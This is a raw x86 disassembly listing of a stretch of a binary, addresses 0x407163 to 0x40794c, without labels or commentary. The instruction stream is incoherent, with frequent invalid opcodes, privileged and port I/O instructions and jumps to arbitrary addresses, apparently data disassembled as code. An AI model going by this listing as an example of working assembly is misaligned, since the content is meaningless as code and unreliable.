  407163:	arpl   WORD PTR [esi+0x2b3ce5c8],di
  407169:	sub    edi,DWORD PTR [ebp-0x5d]
  40716c:	xchg   edx,eax
  40716d:	push   ds
  40716e:	mov    ds:0xf4d2427f,al
  407173:	and    al,0xf4
  407175:	dec    ebp
  407176:	dec    esp
  407177:	mov    dh,0x3a
  407179:	push   0xd203fc9
  40717e:	in     eax,0x71
  407180:	stos   BYTE PTR es:[edi],al
  407181:	adc    ah,BYTE PTR [eax+esi*8-0x2e]
  407185:	sbb    eax,0x362161df
  40718a:	adc    bh,BYTE PTR [esi-0x57]
  40718d:	das    
  40718e:	jecxz  0x40712b
  407190:	sbb    al,0xa6
  407192:	sahf   
  407193:	enter  0x9c6b,0xf
  407197:	add    edx,edi
  407199:	inc    ebp
  40719a:	xor    ebp,ebx
  40719c:	add    eax,0xeb3ac7eb
  4071a1:	cmp    esp,DWORD PTR [eax]
  4071a3:	sar    DWORD PTR [edi],1
  4071a5:	dec    ebx
  4071a6:	sti    
  4071a7:	xor    DWORD PTR [eax+0x3c],edx
  4071aa:	dec    eax
  4071ab:	fisubr DWORD PTR [eax+0x30500d17]
  4071b1:	inc    ecx
  4071b2:	and    al,bh
  4071b4:	dec    eax
  4071b5:	xor    DWORD PTR [ecx-0x647cb343],0xffffffd5
  4071bc:	pop    edi
  4071bd:	sbb    eax,0x212cc88
  4071c2:	outs   dx,BYTE PTR ds:[esi]
  4071c3:	sbb    dh,dl
  4071c5:	std    
  4071c6:	(bad)  
  4071c7:	test   eax,0x7e6d1936
  4071cc:	adc    al,0x42
  4071ce:	or     esp,DWORD PTR [edi-0x3228424f]
  4071d4:	stos   DWORD PTR es:[edi],eax
  4071d5:	cdq    
  4071d6:	add    BYTE PTR [edi],al
  4071d8:	shr    DWORD PTR [edx],cl
  4071da:	cld    
  4071db:	xchg   edi,eax
  4071dc:	add    al,BYTE PTR [edx]
  4071de:	clc    
  4071df:	enter  0xd70e,0x79
  4071e3:	adc    BYTE PTR [edi-0x4240e172],cl
  4071e9:	push   0x9fac0eeb
  4071ee:	pop    edi
  4071ef:	(bad)  
  4071f0:	mov    ebx,0x9db825a2
  4071f5:	xchg   ebp,eax
  4071f6:	mov    al,0xf
  4071f8:	leave  
  4071f9:	pop    edx
  4071fa:	push   ds
  4071fb:	xor    dl,BYTE PTR [eax+0x35]
  4071fe:	pop    ebp
  4071ff:	inc    ebx
  407200:	and    esi,ecx
  407202:	call   0x85ca:0x8a12e39c
  407209:	adc    DWORD PTR [edi-0x56],0x10cadb49
  407210:	je     0x4071a8
  407212:	lods   al,BYTE PTR ds:[esi]
  407213:	aaa    
  407214:	enter  0x6aea,0x63
  407218:	imul   ebp,DWORD PTR [esi+0x72],0xa5d1959c
  40721f:	int3   
  407220:	aas    
  407221:	xor    BYTE PTR [eax+0x52],0x13
  407225:	pop    esi
  407226:	mov    ebp,0xe88a9dae
  40722b:	out    0xda,al
  40722d:	ins    BYTE PTR es:[edi],dx
  40722e:	int    0x24
  407230:	pop    es
  407231:	sub    cl,dl
  407233:	push   es
  407234:	push   cs
  407235:	into   
  407236:	push   cs
  407237:	dec    ebp
  407238:	das    
  407239:	inc    ecx
  40723a:	mov    ecx,0x9362ad1b
  40723f:	popf   
  407240:	mov    ebx,0x68b4298e
  407245:	gs test eax,0x4d12c8c8
  40724b:	adc    eax,0x126c92a8
  407250:	jae    0x407246
  407252:	popf   
  407253:	adc    ecx,DWORD PTR [ebp-0x3c2d1d23]
  407259:	stos   DWORD PTR es:[edi],eax
  40725a:	jo     0x407208
  40725c:	cmp    BYTE PTR [ecx-0x56a02ac1],ch
  407262:	shl    DWORD PTR [edx*8-0x46125d2a],cl
  407269:	push   ebx
  40726a:	push   eax
  40726b:	pop    edi
  40726c:	retf   
  40726d:	pop    ds
  40726e:	push   esi
  40726f:	test   eax,0x8d897307
  407274:	mov    edx,DWORD PTR [edx+edx*4+0x4f]
  407278:	nop    edi
  40727b:	add    ebp,edx
  40727d:	fcomp  DWORD PTR [ecx]
  40727f:	daa    
  407280:	jno    0x4072e9
  407282:	lods   al,BYTE PTR ds:[esi]
  407283:	pop    ecx
  407284:	xchg   ebx,eax
  407285:	add    eax,0xa5e4b723
  40728a:	pop    edi
  40728b:	popa   
  40728c:	rcr    BYTE PTR [ecx],1
  40728e:	nop
  40728f:	add    edi,DWORD PTR [eax]
  407291:	dec    eax
  407292:	sub    DWORD PTR [edx],0x1c
  407295:	mov    ecx,0xc5977231
  40729a:	pop    ss
  40729b:	jmp    0xa78268aa
  4072a0:	xchg   dh,al
  4072a2:	mov    dh,0xc5
  4072a4:	int    0xcd
  4072a6:	dec    ebx
  4072a7:	into   
  4072a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072a9:	sub    eax,0x8cd08626
  4072ae:	adc    edi,DWORD PTR [ecx]
  4072b0:	popf   
  4072b1:	jne    0x407308
  4072b3:	sub    dl,BYTE PTR [eax+ecx*8]
  4072b6:	stc    
  4072b7:	dec    ecx
  4072b8:	add    al,0x43
  4072ba:	stc    
  4072bb:	sub    DWORD PTR [edi],edx
  4072bd:	jmp    0x407268
  4072bf:	in     al,0xc6
  4072c1:	rcr    BYTE PTR [esi+0x30],1
  4072c4:	jno    0x4072fe
  4072c6:	outs   dx,BYTE PTR ds:[esi]
  4072c7:	test   al,0x9c
  4072c9:	and    dh,BYTE PTR [eax]
  4072cb:	call   0x1921bca5
  4072d0:	out    0x4d,al
  4072d2:	or     BYTE PTR [eax-0x62],bh
  4072d5:	popa   
  4072d6:	mov    edi,eax
  4072d8:	(bad)  
  4072d9:	jb     0x40730d
  4072db:	sbb    dh,BYTE PTR [ebp+0x330d53f3]
  4072e1:	inc    edi
  4072e2:	jle    0x407354
  4072e4:	fnstenv [edx]
  4072e6:	push   ecx
  4072e7:	mov    bl,0x17
  4072e9:	adc    ebp,DWORD PTR [ebx]
  4072eb:	adc    al,0x45
  4072ed:	xchg   BYTE PTR [ebp+ebp*4-0x533fe791],bh
  4072f4:	pop    esp
  4072f5:	pop    ss
  4072f6:	mov    WORD PTR [ebx],?
  4072f8:	in     eax,0x2
  4072fa:	mov    esp,0x9ad19f00
  4072ff:	pop    eax
  407300:	out    dx,al
  407301:	(bad)  
  407302:	cli    
  407303:	xor    ax,0x6c6e
  407307:	xor    al,0x50
  407309:	pop    ebx
  40730a:	mov    DWORD PTR [ecx+0x2f612149],eax
  407310:	or     eax,0xf676d80b
  407315:	retf   
  407316:	mov    esi,edx
  407318:	in     al,dx
  407319:	das    
  40731a:	and    bl,BYTE PTR [ebp+0x7ad5b47]
  407320:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407321:	jno    0xacd7929b
  407327:	cmp    eax,0x6580fa25
  40732c:	and    al,0x31
  40732e:	in     eax,dx
  40732f:	cli    
  407330:	in     eax,dx
  407331:	mov    bh,BYTE PTR [edx+0x75452b95]
  407337:	test   eax,0xa56e4a63
  40733c:	into   
  40733d:	enter  0x31e3,0x81
  407341:	mov    eax,ds:0x2d384c3
  407346:	test   al,0xb0
  407348:	pop    ecx
  407349:	shr    BYTE PTR [ecx],1
  40734b:	mov    eax,ds:0xe622726b
  407350:	(bad)  
  407351:	cmp    al,0x5a
  407353:	ja     0x4072fe
  407355:	call   0x1a57c9ce
  40735a:	retf   
  40735b:	aam    0x33
  40735d:	(bad)
  407361:	ss dec esi
  407363:	ja     0x4073a5
  407365:	adc    eax,0x89675a50
  40736a:	sub    dh,0xb2
  40736d:	cld    
  40736e:	loop   0x407391
  407370:	mov    al,0xe5
  407372:	sub    al,0xba
  407374:	mov    bl,BYTE PTR [ebx]
  407376:	(bad)
  40737a:	inc    ecx
  40737b:	and    ch,BYTE PTR [ebx+0x55]
  40737e:	pop    ds
  40737f:	inc    esi
  407380:	mov    esi,0xcfb0f15d
  407385:	add    BYTE PTR [esi+0x426e23d3],ah
  40738b:	test   DWORD PTR [edx],edx
  40738d:	popf   
  40738e:	sahf   
  40738f:	sub    eax,0x9df05af0
  407394:	pop    ss
  407395:	sub    eax,0xb4182ef1
  40739a:	xlat   BYTE PTR ds:[ebx]
  40739b:	cmp    ebx,DWORD PTR [ecx-0x68]
  40739e:	sub    esi,ecx
  4073a0:	into   
  4073a1:	adc    DWORD PTR [edi+edi*2+0x1e],eax
  4073a5:	mov    eax,0x8c5fe347
  4073aa:	sar    BYTE PTR [eax+0xc],0x64
  4073ae:	push   eax
  4073af:	loopne 0x4073c9
  4073b1:	rol    bl,1
  4073b3:	mov    cl,0x1
  4073b5:	pop    ebx
  4073b6:	jb     0x4073ab
  4073b8:	or     eax,0x65ee2047
  4073bd:	pop    esi
  4073be:	outs   dx,BYTE PTR ds:[esi]
  4073bf:	mov    al,0x9f
  4073c1:	das    
  4073c2:	lea    eax,[ebp+edx*8+0x18]
  4073c6:	and    eax,0x4ac7b9e0
  4073cb:	xchg   BYTE PTR [esi-0x227602b0],al
  4073d1:	and    bh,cl
  4073d3:	icebp  
  4073d4:	xchg   esi,eax
  4073d5:	fidivr DWORD PTR [esi]
  4073d7:	xchg   DWORD PTR [edx],esi
  4073d9:	adc    eax,0xe5de0948
  4073de:	add    al,0xc9
  4073e0:	sub    al,al
  4073e2:	jbe    0x40736a
  4073e4:	jmp    0x40745c
  4073e6:	ror    BYTE PTR [edi-0x4e],cl
  4073e9:	xor    BYTE PTR [edi*1-0x38bf893d],al
  4073f0:	push   0x22
  4073f2:	jg     0x40744e
  4073f4:	repz jb 0x4073cc
  4073f7:	jnp    0x40738a
  4073f9:	lods   eax,DWORD PTR ds:[esi]
  4073fa:	mov    ah,BYTE PTR [eax+0xd]
  4073fd:	cli    
  4073fe:	fs push ss
  407400:	push   esp
  407401:	ss dec edx
  407403:	mov    ch,0x25
  407405:	ins    BYTE PTR es:[edi],dx
  407406:	lds    edi,FWORD PTR [ecx]
  407408:	sbb    eax,0x6488768a
  40740d:	hlt    
  40740e:	leave  
  40740f:	adc    DWORD PTR [edi-0xa],0x8
  407413:	clc    
  407414:	in     eax,0x21
  407416:	sub    BYTE PTR [ebx+0x3c],dl
  407419:	push   esp
  40741a:	sti    
  40741b:	pop    esp
  40741c:	push   cs
  40741d:	mov    dl,0x46
  40741f:	jp     0x407408
  407421:	mov    BYTE PTR [ecx],ch
  407423:	lahf   
  407424:	aas    
  407425:	enter  0xf4ba,0xa6
  407429:	xchg   DWORD PTR [esi],esp
  40742b:	pusha  
  40742c:	clc    
  40742d:	push   es
  40742e:	add    BYTE PTR [ebp-0x40912bf5],0x59
  407435:	mov    ch,0xe1
  407437:	or     al,0x9b
  407439:	xor    BYTE PTR [esi+0x3c],bh
  40743c:	mov    dl,0xa9
  40743e:	xchg   esp,eax
  40743f:	cmp    eax,0x7b86b8b8
  407444:	pop    eax
  407445:	adc    BYTE PTR [eax],ah
  407447:	imul   ebp,DWORD PTR [eax+0x42e7751f],0x2d28147
  407451:	push   0x4c
  407453:	cdq    
  407454:	les    eax,FWORD PTR [ecx]
  407456:	inc    ebp
  407457:	jg     0x40745f
  407459:	and    al,0x8c
  40745b:	pusha  
  40745c:	cld    
  40745d:	in     al,dx
  40745e:	xchg   BYTE PTR [ecx],bl
  407460:	ds pushw es
  407463:	imul   ebx,DWORD PTR [ebx-0x17e091a8],0x44ee37b3
  40746d:	cmp    bl,al
  40746f:	and    DWORD PTR [ebx+ebx*1+0x115f9002],ebp
  407476:	push   ds
  407477:	pop    ss
  407478:	xor    BYTE PTR ds:0xfe3c8ea5,cl
  40747e:	scas   al,BYTE PTR es:[edi]
  40747f:	jne    0x407439
  407481:	or     al,0xc4
  407483:	arpl   WORD PTR [eax+0x4a1b9799],cx
  407489:	push   ebx
  40748a:	add    BYTE PTR [edx-0x43e8e205],al
  407490:	mov    WORD PTR [edi-0x17],es
  407493:	lds    edi,FWORD PTR [eax+0x1c9a59d0]
  407499:	arpl   si,bp
  40749b:	push   esp
  40749c:	or     BYTE PTR [edi+0x30],bl
  40749f:	ret    
  4074a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074a1:	mov    ds:0xec64ba59,al
  4074a6:	xchg   BYTE PTR [ebx],bl
  4074a8:	imul   ecx,DWORD PTR [eax],0x4ad68251
  4074ae:	jo     0x407512
  4074b0:	arpl   WORD PTR ds:0xfdc38818,dx
  4074b6:	inc    edi
  4074b7:	cmp    DWORD PTR [esi+0x5fdd18d0],ebp
  4074bd:	aaa    
  4074be:	sub    ebx,0x22fec8bb
  4074c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074c5:	retf   0x48ef
  4074c8:	dec    esp
  4074c9:	sbb    dl,BYTE PTR [esp+edi*2]
  4074cc:	mov    cl,BYTE PTR [ecx]
  4074ce:	adc    eax,0xcf8d5a56
  4074d3:	sub    al,0x2a
  4074d5:	mov    esp,0x8e7325b8
  4074da:	xacquire xchg DWORD PTR [edi+0x4b],esi
  4074de:	jmp    0x1afd4fda
  4074e3:	mov    eax,DWORD PTR [esi]
  4074e5:	mov    eax,0x9c7ecae
  4074ea:	jo     0x40751b
  4074ec:	pop    ds
  4074ed:	es leave 
  4074ef:	cmp    BYTE PTR [ecx+0x61004207],bh
  4074f5:	mov    cl,0x5f
  4074f7:	(bad)  
  4074f8:	and    ecx,ecx
  4074fa:	add    BYTE PTR [ecx-0x61],dh
  4074fd:	clc    
  4074fe:	fsub   DWORD PTR [edi-0x69]
  407501:	pop    esp
  407502:	dec    DWORD PTR [ebp+ecx*8-0x6e]
  407506:	mov    dl,BYTE PTR [ebx-0xd0fb4ea]
  40750c:	mov    cl,0x61
  40750e:	fwait
  40750f:	mov    eax,0xfff0b30b
  407514:	push   0xffffff94
  407516:	stos   BYTE PTR es:[edi],al
  407517:	test   DWORD PTR [esi],esp
  407519:	and    al,BYTE PTR [ebx-0xeab7560]
  40751f:	scas   al,BYTE PTR es:[edi]
  407520:	push   edi
  407521:	in     eax,0x75
  407523:	push   cs
  407524:	xchg   esp,eax
  407525:	push   ecx
  407526:	shl    DWORD PTR [edi-0x381ad537],cl
  40752c:	dec    ebx
  40752d:	(bad)  
  40752e:	cmp    cl,BYTE PTR ds:0xa8be2e54
  407534:	int    0x93
  407536:	dec    esp
  407537:	mov    dl,0x51
  407539:	fwait
  40753a:	mov    esi,0xb9d3dd64
  40753f:	fwait
  407540:	dec    eax
  407541:	test   al,0x12
  407543:	popf   
  407544:	lds    ebp,FWORD PTR [esp-0x28]
  407548:	stc    
  407549:	fsubr  QWORD PTR [ebp+0x7a42583]
  40754f:	imul   edx,DWORD PTR [edi],0xdb71a67b
  407555:	ret    0x9026
  407558:	(bad)  
  407559:	sti    
  40755a:	ins    DWORD PTR es:[edi],dx
  40755b:	aad    0x45
  40755d:	cld    
  40755e:	mul    BYTE PTR ds:0x5e58e3d7
  407564:	adc    DWORD PTR [ebx],esi
  407566:	fiadd  DWORD PTR [esi+eiz*2-0x35]
  40756a:	test   DWORD PTR [eax+0x5baf41ea],ecx
  407570:	sub    BYTE PTR [ebx-0x5358ab40],al
  407576:	jge    0x4075b4
  407578:	fbld   TBYTE PTR [edi+0x2f]
  40757b:	and    BYTE PTR [edx],dl
  40757d:	cmp    ebp,DWORD PTR [edi+0x4a53e402]
  407583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407584:	mov    dl,0x9b
  407586:	std    
  407587:	(bad)  
  407588:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407589:	jo     0x407518
  40758b:	retf   0xd2fd
  40758e:	repz or BYTE PTR [esp+edx*2],0x90
  407593:	mov    bh,0x0
  407595:	lea    ebx,[esi+0x14]
  407598:	inc    ecx
  407599:	pop    ecx
  40759a:	jecxz  0x40751f
  40759c:	cli    
  40759d:	ds loopne 0x407600
  4075a0:	jl     0x4075d8
  4075a2:	push   ss
  4075a3:	rcl    BYTE PTR ds:0x2d9d1643,1
  4075a9:	jmp    0xaca3:0xd9e8cb20
  4075b0:	add    DWORD PTR [ebx],eax
  4075b2:	mov    al,0xca
  4075b4:	rcl    BYTE PTR [esi+0x60f6218],1
  4075ba:	and    BYTE PTR [ebx-0x5ac21dcf],ch
  4075c0:	sub    esp,DWORD PTR [edx]
  4075c2:	pop    ecx
  4075c3:	push   edi
  4075c4:	inc    ebp
  4075c5:	mov    eax,ds:0xeb0af8
  4075ca:	mov    ch,0x80
  4075cc:	dec    ebx
  4075cd:	xor    al,0xe0
  4075cf:	fdivr  st(4),st
  4075d1:	dec    ecx
  4075d2:	or     BYTE PTR [esi],bh
  4075d4:	dec    ebx
  4075d5:	(bad)  
  4075d7:	and    al,0xdb
  4075d9:	jmp    0xe1f023af
  4075de:	mov    ebx,0x4b186125
  4075e3:	add    ch,BYTE PTR [edi+eax*2+0x6f]
  4075e7:	dec    ebx
  4075e8:	out    0xa9,eax
  4075ea:	sub    DWORD PTR [edx],0x1c
  4075ed:	jne    0x407660
  4075ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075f0:	dec    esi
  4075f1:	sbb    esi,DWORD PTR [eax]
  4075f3:	(bad)  
  4075f4:	ror    DWORD PTR [eax],1
  4075f6:	cmp    al,BYTE PTR ds:0x7deeefb4
  4075fc:	fwait
  4075fd:	dec    ebx
  4075fe:	stc    
  4075ff:	pop    esi
  407600:	aas    
  407601:	cld    
  407602:	test   al,0xc9
  407604:	xor    al,0x74
  407606:	xchg   edx,eax
  407607:	(bad)  
  407608:	retf   0xd9b7
  40760b:	cld    
  40760c:	leave  
  40760d:	jae    0x407629
  40760f:	xchg   edx,eax
  407610:	test   eax,0xd2087c60
  407615:	and    eax,0xcb31ae9a
  40761a:	sbb    al,0x16
  40761c:	scas   eax,DWORD PTR es:[edi]
  40761d:	push   edx
  40761e:	shl    DWORD PTR [ecx+eiz*4-0x78],0xe7
  407623:	jmp    0x5fef1072
  407628:	call   0x6fc9613f
  40762d:	add    DWORD PTR [eax+ecx*4],ebx
  407630:	mov    eax,0xcb91400
  407635:	adc    edx,eax
  407637:	jne    0x407680
  407639:	or     edx,DWORD PTR [eax+0x43ac225c]
  40763f:	arpl   WORD PTR [eax],cx
  407641:	push   ss
  407642:	cmc    
  407643:	sbb    eax,0x9f304ab1
  407648:	enter  0x9283,0x46
  40764c:	push   ecx
  40764d:	stc    
  40764e:	stos   BYTE PTR es:[edi],al
  40764f:	ins    BYTE PTR es:[edi],dx
  407650:	jno    0x407643
  407652:	retf   0xb770
  407655:	daa    
  407656:	daa    
  407657:	fstp   QWORD PTR [esi+0x29750900]
  40765d:	cmp    eax,DWORD PTR [edx+eiz*4]
  407660:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407661:	xor    BYTE PTR [ecx],ch
  407663:	mov    bl,0xf7
  407665:	ds xchg esp,eax
  407667:	frstor [esi+0x48deac29]
  40766d:	cli    
  40766e:	test   cl,0x2
  407671:	sbb    eax,0x51f06236
  407676:	js     0x4076c7
  407678:	jge    0x407628
  40767a:	popa   
  40767b:	push   esp
  40767c:	adc    DWORD PTR [eax],esp
  40767e:	xlat   BYTE PTR ds:[ebx]
  40767f:	sub    ebx,DWORD PTR ds:0xb712c997
  407685:	popf   
  407686:	lods   al,BYTE PTR gs:[esi]
  407688:	adc    DWORD PTR [ecx+0x6f],esi
  40768b:	jmp    0x40764e
  40768d:	rol    BYTE PTR [ebx-0x7d],0x73
  407691:	test   eax,0x1c2c7cba
  407696:	ret    0x9a6b
  407699:	mov    ebx,0xb16ca48c
  40769e:	xchg   edi,eax
  40769f:	pop    es
  4076a0:	fidivr WORD PTR [esi+0xf638045]
  4076a6:	imul   edx,DWORD PTR [ebp+0x563862b3],0x1e91dfec
  4076b0:	mov    al,0x9b
  4076b2:	jne    0x4076dd
  4076b4:	repz jb 0x407735
  4076b7:	adc    DWORD PTR [edx],0x45
  4076ba:	mov    fs,edx
  4076bc:	jnp    0x4076f6
  4076be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076bf:	sub    DWORD PTR [eax],ecx
  4076c1:	add    al,0x95
  4076c3:	retf   0x4aca
  4076c6:	fiadd  WORD PTR [ebx]
  4076c8:	out    0x5d,al
  4076ca:	(bad)  
  4076cc:	inc    eax
  4076cd:	(bad)  
  4076ce:	call   0xd3a:0x61530e51
  4076d5:	scas   al,BYTE PTR es:[edi]
  4076d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076d7:	or     al,0x66
  4076d9:	mov    esp,0x98b6b57e
  4076de:	fidivr DWORD PTR [eax+0x17]
  4076e1:	pushf  
  4076e2:	sbb    bh,BYTE PTR [esi+0x36]
  4076e5:	push   esi
  4076e6:	(bad)  
  4076e7:	mov    cl,0x21
  4076e9:	cwde   
  4076ea:	push   esp
  4076eb:	xchg   ebx,eax
  4076ec:	imul   esp,DWORD PTR [ebx],0x660aa029
  4076f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076f3:	and    ah,0x52
  4076f6:	in     al,dx
  4076f7:	rcl    DWORD PTR [ebx+0x62],cl
  4076fa:	add    al,0xf5
  4076fc:	cs jl  0x407701
  4076ff:	inc    edi
  407700:	mov    al,ds:0xd8a62182
  407705:	push   es
  407706:	mov    al,ds:0x3cae0154
  40770b:	div    eax
  40770d:	push   DWORD PTR [ebp+0x2181f24d]
  407713:	xor    dh,bh
  407715:	pusha  
  407716:	adc    dh,BYTE PTR [eax-0x72]
  407719:	outs   dx,BYTE PTR ds:[esi]
  40771a:	cmp    eax,0x44a2ebc9
  40771f:	dec    edx
  407720:	push   ecx
  407721:	inc    bp
  407723:	cmp    eax,0xb648fff2
  407728:	jecxz  0x4076ae
  40772a:	in     al,dx
  40772b:	xchg   esp,eax
  40772c:	push   ebp
  40772d:	cmp    esp,0x94660b4e
  407733:	nop
  407734:	je     0x40770a
  407736:	gs xchg edi,eax
  407738:	add    DWORD PTR [ebx+0x20],0xaeea63e4
  40773f:	mov    ebx,0x76e10ef9
  407744:	shr    DWORD PTR [edi+0x6a],cl
  407747:	add    ah,bl
  407749:	mov    esp,0x94372d1e
  40774e:	inc    eax
  40774f:	(bad)  
  407751:	push   eax
  407752:	mov    ds:0x4e2e1bc7,eax
  407757:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407758:	aaa    
  407759:	fwait
  40775a:	nop
  40775b:	pop    ebp
  40775c:	ret    
  40775d:	and    DWORD PTR [ebx-0x51ad306e],edx
  407763:	jae    0x407716
  407765:	jb     0x407788
  407767:	retf   
  407768:	add    DWORD PTR [edx],ecx
  40776a:	or     esp,DWORD PTR [edx-0x75]
  40776d:	cmp    DWORD PTR [esi-0x4ea4a933],ecx
  407773:	sub    al,0x42
  407775:	jnp    0x407781
  407777:	xlat   BYTE PTR ds:[ebx]
  407778:	dec    ebx
  407779:	sub    eax,0x15225882
  40777e:	cmc    
  40777f:	jecxz  0x4077b6
  407781:	js     0x40774e
  407783:	fadd   DWORD PTR ds:0xc2eccd76
  407789:	cmc    
  40778a:	push   es
  40778b:	sub    eax,0x2a6f2482
  407790:	push   esp
  407791:	nop
  407792:	sub    al,0x9d
  407794:	mov    ecx,0xbffbbf7e
  407799:	xor    eax,0xf0081b4a
  40779e:	into   
  40779f:	fild   WORD PTR [ebx]
  4077a1:	and    bh,BYTE PTR ds:0x191646c7
  4077a7:	adc    DWORD PTR [eax+edx*4+0x33],ebp
  4077ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077ac:	push   cs
  4077ad:	std    
  4077ae:	hlt    
  4077af:	add    esi,DWORD PTR [edx+edx*8+0x5833994c]
  4077b6:	push   0xffffffab
  4077b8:	pop    esp
  4077b9:	(bad)  
  4077ba:	fdivr  DWORD PTR [esi+0x30]
  4077bd:	push   DWORD PTR [esi]
  4077bf:	mov    fs,esp
  4077c1:	sbb    al,0x49
  4077c3:	mov    WORD PTR [eax-0x22],?
  4077c6:	pushf  
  4077c7:	in     al,0xbc
  4077c9:	xor    ebx,DWORD PTR [edi+0x48]
  4077cc:	or     BYTE PTR [ecx],ah
  4077ce:	mov    ebp,0xd16eea1
  4077d3:	bnd jle 0x40775b
  4077d6:	xor    ebp,eax
  4077d8:	mov    dl,0xb7
  4077da:	add    DWORD PTR [ebp-0x40],ebx
  4077dd:	scas   al,BYTE PTR es:[edi]
  4077de:	fldpi  
  4077e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077e1:	outs   dx,BYTE PTR ds:[esi]
  4077e2:	lahf   
  4077e3:	pop    esi
  4077e4:	adc    al,0x7e
  4077e6:	mov    ah,0x31
  4077e8:	dec    edx
  4077e9:	ins    BYTE PTR es:[edi],dx
  4077ea:	into   
  4077eb:	xchg   ebp,eax
  4077ec:	jae    0x4077bf
  4077ee:	mov    dh,0x70
  4077f0:	int    0xd6
  4077f2:	push   0xdbd55992
  4077f7:	in     al,dx
  4077f8:	in     al,0xa4
  4077fa:	xchg   edx,eax
  4077fb:	imul   edx,DWORD PTR [esp+edi*8],0xaaff9c5f
  407802:	pop    esp
  407803:	jmp    0x407884
  407805:	inc    ebx
  407806:	call   FWORD PTR [eax]
  407808:	and    BYTE PTR [edx+0x54],bh
  40780b:	sub    DWORD PTR [eax+0x3b004313],edx
  407811:	push   esp
  407812:	wrmsr  
  407814:	push   esi
  407815:	int    0x56
  407817:	fstp   st(2)
  407819:	cmp    edx,esi
  40781b:	int    0x75
  40781d:	jl     0x407898
  40781f:	out    dx,al
  407820:	xlat   BYTE PTR ds:[ebx]
  407821:	fdiv   st,st(7)
  407823:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407824:	push   0xf0f57fea
  407829:	(bad)  
  40782a:	out    0xd4,al
  40782c:	scas   eax,DWORD PTR es:[edi]
  40782d:	xchg   DWORD PTR [ebp-0x15ed7b2c],esp
  407833:	sub    BYTE PTR [eax-0x6f],bh
  407836:	add    eax,0x4b147f5d
  40783b:	or     al,0x27
  40783d:	shl    BYTE PTR [eax],cl
  40783f:	retf   0x23a0
  407842:	test   al,0x14
  407844:	sub    ecx,edx
  407846:	sub    DWORD PTR [ecx+0x60],edx
  407849:	adc    eax,0xc89f7e16
  40784e:	je     0x407877
  407850:	mov    al,ds:0xf48f7488
  407855:	std    
  407856:	out    0xde,eax
  407858:	push   cs
  407859:	cmp    edi,DWORD PTR [ebp+esi*8+0x55]
  40785d:	cmc    
  40785e:	jae    0x4078ce
  407860:	dec    ebx
  407861:	popf   
  407862:	mov    esp,0xda1060c2
  407867:	and    eax,0xdbbbdbea
  40786c:	cs in  al,0xfa
  40786f:	adc    bl,dh
  407871:	sub    dh,BYTE PTR es:[edx+0x6e0d6abb]
  407878:	iret   
  407879:	cmc    
  40787a:	xchg   edi,eax
  40787b:	push   esi
  40787c:	ins    WORD PTR es:[edi],dx
  40787e:	pusha  
  40787f:	add    bl,cl
  407881:	pushf  
  407882:	call   0x5fd5:0x5a69cf6c
  407889:	push   ecx
  40788a:	data16 sbb BYTE PTR [esi+0x36d40922],bl
  407891:	repnz xlat BYTE PTR ds:[ebx]
  407893:	xor    eax,0x2cdd36b8
  407898:	inc    ebx
  407899:	cmp    eax,DWORD PTR [ebx+0x41099df8]
  40789f:	dec    ebp
  4078a0:	fs lock in al,dx
  4078a3:	or     BYTE PTR [eax],0x10
  4078a6:	lds    ebx,FWORD PTR [ebx+ebx*8]
  4078a9:	inc    ebx
  4078aa:	adc    al,0x47
  4078ac:	fbstp  TBYTE PTR [edx+0x55]
  4078af:	add    eax,0x75a0b24c
  4078b4:	mov    ebp,0x121dbe63
  4078b9:	sbb    cl,BYTE PTR [ebx-0x58]
  4078bc:	add    BYTE PTR [eax+0x16],ah
  4078bf:	add    al,0xb8
  4078c1:	cmp    ebp,DWORD PTR [ebp+0x9]
  4078c4:	repz cmp BYTE PTR [ecx],cl
  4078c7:	loope  0x407865
  4078c9:	test   al,0x9
  4078cb:	sbb    BYTE PTR [ebp+0x7919df5c],0xcf
  4078d2:	push   esi
  4078d3:	data16 fdiv QWORD PTR [edi+0x7c]
  4078d7:	sbb    dl,dl
  4078d9:	jmp    0x407950
  4078db:	lea    eax,[eax+0x7a]
  4078de:	clc    
  4078df:	push   eax
  4078e0:	fadd   DWORD PTR [eax+0x5d9ed9ea]
  4078e6:	cmc    
  4078e7:	sbb    BYTE PTR [esi-0x52ca20fc],bh
  4078ed:	popf   
  4078ee:	cdq    
  4078ef:	sbb    DWORD PTR [edi-0x642c1d19],eax
  4078f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078f6:	iret   
  4078f7:	mov    bl,0xd0
  4078f9:	lock in eax,0xf1
  4078fc:	inc    ebx
  4078fd:	add    al,0x38
  4078ff:	dec    edx
  407900:	mov    bl,0x9d
  407902:	sahf   
  407903:	add    BYTE PTR [esi-0x4544344d],dl
  407909:	stos   BYTE PTR es:[edi],al
  40790a:	mov    ds,WORD PTR [eax-0x7e4fd84e]
  407910:	and    ah,BYTE PTR [edi]
  407912:	fild   QWORD PTR [edi]
  407914:	cli    
  407915:	popa   
  407916:	sbb    BYTE PTR [ebp+0x84963d3],ch
  40791c:	pop    ds
  40791d:	shl    BYTE PTR fs:[ecx+0x1eb8718a],0xb1
  407925:	jl     0x40791f
  407927:	sub    al,0x1f
  407929:	inc    ecx
  40792a:	(bad)  
  40792b:	loopne 0x407939
  40792d:	and    eax,0x50d45ca0
  407932:	(bad)  
  407933:	jno    0x407946
  407935:	and    dh,BYTE PTR [ebp+0x8d8e78]
  40793b:	adc    dl,al
  40793d:	push   cs
  40793e:	inc    edx
  40793f:	mov    bh,0x5b
  407941:	lds    esi,FWORD PTR [esi+0x5]
  407944:	loopne 0x407964
  407946:	rol    BYTE PTR [edi-0x2ac48526],1
  40794c:	popa   
